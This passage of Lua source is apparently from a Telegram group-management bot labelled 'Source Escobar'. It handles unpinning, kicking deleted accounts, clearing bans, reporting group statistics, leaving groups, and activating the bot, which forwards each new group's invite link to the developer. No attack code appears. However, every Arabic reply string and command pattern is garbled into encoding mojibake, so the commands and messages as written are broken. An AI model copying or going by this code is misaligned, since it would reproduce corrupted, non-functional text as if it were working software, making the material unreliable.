Dev_mfm(msg.chat_id_,msg.id_, 1, "β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨ§ΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩΩΩΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
Devmfm:del(mustafa..'mfm:PinnedMsg'..msg.chat_id_)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"β β« Ψ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΩΨ’ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")  
return false  
end
end,nil)
end
--     Source Escobar     --
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΩΩ$") then  
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨ§ΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩΩΩΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
Devmfm:del(mustafa.."mfm:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"β β« Ψ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΩΨ’ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")  
return false  
end
end,nil)
end
--     Source Escobar     --
if text and text:match("^Ψ§ΨΉΨ§Ψ―Ω ΨͺΨ«Ψ¨ΩΨͺ$") and ChCheck(msg) or text and text:match("^Ψ§ΨΉΨ§Ψ―Ω Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ$") and ChCheck(msg) or text and text:match("^Ψ§ΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ$") and ChCheck(msg) then
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨ§ΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩΩΩΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ", 1, 'md')
return false  
end
local pin_id = Devmfm:get(mustafa..'mfm:PinnedMsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ Ψ§ΨΉΨ§Ψ―Ψ© ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end end
end
--     Source Escobar     --
if text == 'Ψ·Ψ±Ψ― Ψ§ΩΩΨ­Ψ°ΩΩΩΩ' or text == 'ΩΨ³Ψ­ Ψ§ΩΩΨ­Ψ°ΩΩΩΩ' or text == 'Ψ·Ψ±Ψ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ Ψ§ΩΩΨ­Ψ°ΩΩΩ' or text == 'Ψ­Ψ°Ω Ψ§ΩΩΨ­Ψ°ΩΩΩΩΩ°Ω' then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ·Ψ±Ψ― Ψ§ΩΩΨ­Ψ°ΩΩΩΩΩ°Ω")  
end,nil)
end
--     Source Escobar     --
if text and text:match("^ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ$") or text and text:match("^Ψ­Ψ°Ω Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ$") and ChCheck(msg) or text and text:match("^ΩΨ³Ψ­ Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ$") or text and text:match("^Ψ­Ψ°Ω Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_mfm(msg.chat_id_, msg.id_, 0,'β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ*', 1, 'md')
Devmfm:del(mustafa..'mfm:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
Devmfm:del(mustafa..'mfm:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     Source Escobar     --
if text and text:match("^ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΨ©$") and ChCheck(msg) or text and text:match("^ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘$") and ChCheck(msg) or text and text:match("^ΨΉΨ―Ψ― Ψ§ΩΩΨ±ΩΨ¨$") and ChCheck(msg) or text and text:match("^ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ―ΩΩΩΩ$") and ChCheck(msg) or text and text:match("^ΨΉΨ―Ψ― Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ$") and ChCheck(msg) then
local Muted = Devmfm:scard(mustafa.."mfm:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β¨ '..dp.title_..' β©\nβ β« Ψ§ΩΨ§ΩΨ―Ω β β¨ '..msg.chat_id_..' β©\nβ β« ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ β β¨ *'..data.member_count_..'* β©\nβ β« ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ―ΩΩΩΩ β β¨ *'..data.administrator_count_..'* β©\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ β β¨ *'..data.kicked_count_..'* β©\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΩΨͺΩΩΩΩ β β¨ *'..Muted..'* β©\nβ β« ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β¨ *'..(msg.id_/2097152/0.5)..'* β©\nββββ EB ββββ\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source Escobar     --
if text and text:match('^ΩΨ΄Ω (-%d+)') then
local ChatId = text:match('ΩΨ΄Ω (-%d+)') 
if not SudoBot(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ±ΩΩ ΩΩΨ·', 1, 'md')
else
local ConstructorList = Devmfm:scard(mustafa.."mfm:Constructor:"..ChatId) or 0
local BanedList = Devmfm:scard(mustafa.."mfm:Ban:"..ChatId) or 0
local ManagerList = Devmfm:scard(mustafa.."mfm:Managers:"..ChatId) or 0
local MutedList = Devmfm:scard(mustafa.."mfm:Muted:"..ChatId) or 0
local TkeedList = Devmfm:scard(mustafa.."mfm:mfm:Tkeed:"..ChatId) or 0
local AdminsList = Devmfm:scard(mustafa.."mfm:Admins:"..ChatId) or 0
local VipList = Devmfm:scard(mustafa.."mfm:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/TEAM_Escobar' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,mfm) 
if mfm.first_name_ ~= false then
Constructormfm = "["..mfm.first_name_.."](T.me/"..(mfm.username_ or "TEAM_Escobar")..")"
else 
Constructormfm = "Ψ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..dp.title_.."]("..LinkGroup..")\nβ β« Ψ§ΩΨ§ΩΨ―Ω β ( `"..ChatId.."` )\nβ β« Ψ§ΩΩΩΨ΄Ψ¦ β "..Constructormfm.."\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ β ( *"..ManagerList.."* )\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΩΨ΄Ψ¦ΩΩ β ( *"..ConstructorList.."* )\nβ β« ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ―ΩΩΩΩ β ( *"..AdminsList.."* )\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΩΩΨ²ΩΩ β ( *"..VipList.."* )\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ β ( *"..BanedList.."* )\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΩΩΨ―ΩΩ β ( *"..TkeedList.."* )\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΩΨͺΩΩΩΩ β ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΩ ΨͺΨͺΩ Ψ§ΨΆΨ§ΩΨͺΩ Ψ¨ΩΨ§ ΩΨ§ΩΩΩ Ψ¨ΩΨ΄ΩΩΨ§", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source Escobar     --
if text and text:match("^ΨΊΨ§Ψ―Ψ± (-%d+)$")  then
local Text = { string.match(text, "^(ΨΊΨ§Ψ―Ψ±) (-%d+)$")}
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ·', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..dp.title_.."]\nβ β« ΨͺΩΨͺ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω ΩΩΩΨ§ Ψ¨ΩΨ¬Ψ§Ψ­", 1, "md")
Dev_mfm(Text[2], 0, 1, "β β« Ψ¨Ψ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ΨͺΩΩΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© ΩΨ°Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ", 1, "md")  
ChatLeave(dp.id_, mustafa)
Devmfm:srem(mustafa.."mfm:Groups", dp.id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΩ ΨͺΨͺΩ Ψ§ΨΆΨ§ΩΨͺΩ Ψ¨ΩΨ§ ΩΨ§ΩΩΩ Ψ¨ΩΨΊΨ§Ψ―Ψ±ΨͺΩΨ§", 1, "md")
end 
end,nil)
end 
end
--     Source Escobar     --
if text and text:match("^ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") and SecondSudo(msg) or text and text:match("^ΨͺΨΉΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") and SecondSudo(msg) then
local Num = text:match("ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") or text:match("ΨͺΨΉΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$")
Devmfm:set(mustafa..'mfm:Num:Add:Bot',Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ β *'..Num..'* ΨΉΨΆΩΩΩΩ', 1, 'md')
end
--     Source Escobar     --
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ' then 
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ·', 1, 'md')
else 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:FreeBot'..mustafa) 
end 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ' then 
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ·', 1, 'md')
else 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:FreeBot'..mustafa,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨' and Manager(msg) and ChCheck(msg) or text == 'ΨͺΩΨΉΩΩ Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π?' and Manager(msg) and ChCheck(msg) then   
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Games'..msg.chat_id_) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨' and Manager(msg) and ChCheck(msg) or text == 'ΨͺΨΉΨ·ΩΩ Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π?' and Manager(msg) and ChCheck(msg) then  
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Games'..msg.chat_id_,true)  
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" or text == "ΨͺΩΨΉΩΩ Ψ¬ΩΨ¨ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" then 
if Admin(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ¬ΩΨ¨ Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" or text == "ΨͺΨΉΨ·ΩΩ Ψ¬ΩΨ¨ Ψ§ΩΨ±Ψ§Ψ¨Ψ·" then 
if Admin(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ¬ΩΨ¨ Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
--     Source Escobar     --
if text and text:match('^ΨͺΩΨΉΩΩ$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΨΉΨ§Ψ―ΩΩ ΩΩΩΨ³Ψͺ Ψ?Ψ§Ψ±ΩΩ ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨΉΩΩΩ ΩΨ±Ψ¬Ω Ψ§Ω ΨͺΨΆΨΉ Ψ³Ψ¬Ω Ψ±Ψ³Ψ§Ψ¦Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΨΆΨ§ΩΨ± ΩΩΩΨ³ ΩΨ?ΩΩΩΩ° ΩΩΩ Ψ¨ΨΉΨ―ΩΨ§ ΩΩΩΩΩ Ψ±ΩΨΉΩ Ψ§Ψ―ΩΩ Ψ«Ω ΨͺΩΨΉΩΩΩ', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ§ΩΩ ΩΩ β *'..(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0)..'* ΨΉΨΆΩΩΩΩ', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
Devmfm:sadd(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:sadd(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:srem(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩΩ', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© "..dp.title_)  
Devmfm:sadd(mustafa.."mfm:Groups",msg.chat_id_)
if not Devmfm:get(mustafa..'mfm:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
Devmfm:incrby(mustafa..'mfm:Sudos'..msg.sender_user_id_,1)
Devmfm:set(mustafa..'mfm:SudosGp'..msg.sender_user_id_..msg.chat_id_,"mfm")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω β β₯‘ \nββββ EB ββββ\nβ β« Ψ¨ΩΨ§Ψ³Ψ·Ψ© β "..Name.."\nβ β« Ψ§Ψ³Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..NameChat.."]\nβ β« ΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β¨ *"..NumMem.."* β©\nβ β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ \nβ¨ `"..msg.chat_id_.."` β©\nβ β« Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘\nβ¨ ["..LinkGroup.."] β©\nββββ EB ββββ\nβ β« Ψ§ΩΩΩΨͺ β "..os.date("%I:%M%p").."\nβ β« Ψ§ΩΨͺΨ§Ψ±ΩΨ? β "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'ΨͺΨΉΨ·ΩΩ' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩΨ·ΩΩ', 1, 'md')
else
